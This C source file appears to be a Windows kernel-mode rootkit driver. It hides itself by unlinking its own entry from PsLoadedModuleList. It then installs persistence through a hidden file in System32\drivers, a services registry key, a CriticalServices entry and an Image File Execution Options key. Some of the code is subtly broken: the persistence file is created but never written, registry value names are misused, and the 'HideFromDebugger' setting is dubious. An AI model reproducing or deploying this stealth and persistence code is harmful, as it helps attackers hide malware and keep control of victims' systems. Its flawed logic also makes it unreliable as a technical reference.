/*
//================================
#include <ntddk.h>

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Unloading......\n");
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    (void)DriverObject;
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "[+] Rkit Driver Loaded.......\n");

    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
//================================
*/

#include <ntddk.h>
#include "log_utils.h"

extern PVOID PsLoadedModuleList;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    PVOID    Reserved[2];
    PVOID    Base;
    PVOID    EntryPoint;
    ULONG    Size;
    ULONG    Flags;
    USHORT   LoadCount;
    USHORT   ModuleNameOffset;
    CHAR     ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG                        ModuleCount;
    SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(*NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(*NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject);

VOID HideDriver(PDRIVER_OBJECT DriverObject);
VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject);
NTSTATUS InstallFilePersistence(VOID);
NTSTATUS InstallRegistryPersistence(VOID);
NTSTATUS ModifyLoadOrderGroup(VOID);
NTSTATUS HideInImageFileExecutionOptions(VOID);

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,
    IN PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    LogMessage("[+] Basic Driver Loaded\n");

    DriverObject->DriverUnload = DriverUnload;

    HideDriver(DriverObject);

    // Install file-based persistence
    if (!NT_SUCCESS(InstallFilePersistence())) {
        LogMessage("[-] Failed to install file-based persistence.\n");
    }

    if (!NT_SUCCESS(InstallRegistryPersistence())) {
        LogMessage("[-] Failed to install registry-based persistence.\n");
    }

    if (!NT_SUCCESS(ModifyLoadOrderGroup())) {
        LogMessage("[-] Failed to modify load order group.\n");
    }

    if (!NT_SUCCESS(HideInImageFileExecutionOptions())) {
        LogMessage("[-] Failed to hide in Image File Execution Options.\n");
    }

    return STATUS_SUCCESS;
}


VOID HideDriver(PDRIVER_OBJECT DriverObject) {
    RemoveFromLoadedModulesList(DriverObject);
    LogMessage("[+] Driver hidden from PsLoadedModuleList\n");
}

VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject) {
    PLIST_ENTRY moduleList = (PLIST_ENTRY)PsLoadedModuleList;
    PLIST_ENTRY currentEntry = moduleList->Flink;
    PLDR_DATA_TABLE_ENTRY current;

    while (currentEntry != moduleList) {
        current = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (current->DllBase == DriverObject->DriverStart) {
            current->InLoadOrderLinks.Blink->Flink = current->InLoadOrderLinks.Flink;
            current->InLoadOrderLinks.Flink->Blink = current->InLoadOrderLinks.Blink;
            LogMessage("[+] Driver unlinked from PsLoadedModuleList.\n");
            break;
        }
        currentEntry = currentEntry->Flink;
    }
}

// File-based persistence mechanism
NTSTATUS InstallFilePersistence(VOID) {
    WCHAR filePath[] = L"\\SystemRoot\\System32\\drivers\\lmr9abb.sys";
    OBJECT_ATTRIBUTES objAttr;
    HANDLE fileHandle;
    IO_STATUS_BLOCK ioStatus;
    UNICODE_STRING fileName;
    NTSTATUS status;

    RtlInitUnicodeString(&fileName, filePath);
    InitializeObjectAttributes(&objAttr, &fileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateFile(&fileHandle, GENERIC_WRITE | SYNCHRONIZE, &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (NT_SUCCESS(status)) {
        ZwClose(fileHandle);
        LogMessage("[+] File-based persistence installed.\n");
    }
    else {
        LogMessage("[-] Failed to install file-based persistence. Status: 0x%X\n", status);
    }

    return status;
}

VOID
DriverUnload(IN PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    LogMessage("[+] Basic Driver Unloading......\n");
    CloseLogFile();
}

NTSTATUS
InstallRegistryPersistence(VOID) {
    UNICODE_STRING serviceName;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE keyHandle;
    NTSTATUS status;
    WCHAR registryPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\lmr9abb";
    WCHAR driverPath[] = L"\\SystemRoot\\System32\\drivers\\lmr9abb.sys";

    // Create or open the registry key for the driver
    RtlInitUnicodeString(&serviceName, registryPath);
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateKey(&keyHandle, KEY_WRITE, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create or open registry key. Status: 0x%X\n", status);
        return status;
    }

    // Set the driver’s image path
    UNICODE_STRING imagePath;
    RtlInitUnicodeString(&imagePath, driverPath);
    status = ZwSetValueKey(keyHandle, &serviceName, 0, REG_SZ, imagePath.Buffer, imagePath.Length + sizeof(WCHAR));
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to set registry value for driver image path. Status: 0x%X\n", status);
    }
    else {
        LogMessage("[+] Registry-based persistence installed.\n");
    }

    ZwClose(keyHandle);
    return status;
}

// Load order group modification for persistence
NTSTATUS
ModifyLoadOrderGroup(VOID) {
    UNICODE_STRING serviceName;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE keyHandle;
    NTSTATUS status;
    WCHAR registryPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\CriticalServices";

    // Create or open the registry key for critical services
    RtlInitUnicodeString(&serviceName, registryPath);
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateKey(&keyHandle, KEY_WRITE, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create or open registry key for critical services. Status: 0x%X\n", status);
        return status;
    }

    // Set a new registry value for the load order group
    UNICODE_STRING valueName;
    WCHAR loadOrderGroup[] = L"lmr9abb";
    RtlInitUnicodeString(&valueName, loadOrderGroup);
    ULONG dataSize = (ULONG)((wcslen(loadOrderGroup) + 1) * sizeof(WCHAR));
    status = ZwSetValueKey(keyHandle, &valueName, 0, REG_SZ, loadOrderGroup, dataSize);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to set registry value for load order group. Status: 0x%X\n", status);
    }
    else {
        LogMessage("[+] Load order group modification for persistence installed.\n");
    }

    ZwClose(keyHandle);
    return status;
}

// Hide the driver in Image File Execution Options
NTSTATUS
HideInImageFileExecutionOptions(VOID) {
    UNICODE_STRING serviceName;
    OBJECT_ATTRIBUTES objAttr;
    HANDLE keyHandle;
    NTSTATUS status;
    WCHAR registryPath[] = L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lmr9abb.sys";

    // Create or open the registry key for Image File Execution Options
    RtlInitUnicodeString(&serviceName, registryPath);
    InitializeObjectAttributes(&objAttr, &serviceName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    status = ZwCreateKey(&keyHandle, KEY_WRITE, &objAttr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to create or open registry key for Image File Execution Options. Status: 0x%X\n", status);
        return status;
    }

    // Set the HideFromDebugger value
    ULONG hideFromDebugger = 1;
    status = ZwSetValueKey(keyHandle, &serviceName, 0, REG_DWORD, &hideFromDebugger, sizeof(hideFromDebugger));
    if (!NT_SUCCESS(status)) {
        LogMessage("[-] Failed to set registry value for HideFromDebugger. Status: 0x%X\n", status);
    }
    else {
        LogMessage("[+] Driver hidden in Image File Execution Options.\n");
    }

    ZwClose(keyHandle);
    return status;
}
